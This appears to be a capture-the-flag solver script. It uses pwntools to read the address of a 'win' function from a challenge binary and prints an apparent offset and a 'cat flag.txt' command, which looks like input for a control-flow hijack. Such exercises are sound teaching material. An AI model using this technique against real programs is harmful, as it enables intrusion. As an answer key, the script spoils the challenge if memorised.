import os

os.chdir(os.path.dirname(__file__))

from pwn import ELF

elf = ELF("handout/chal", checksec=False)

print(110)
print(elf.symbols["win"])
print("cat flag.txt")
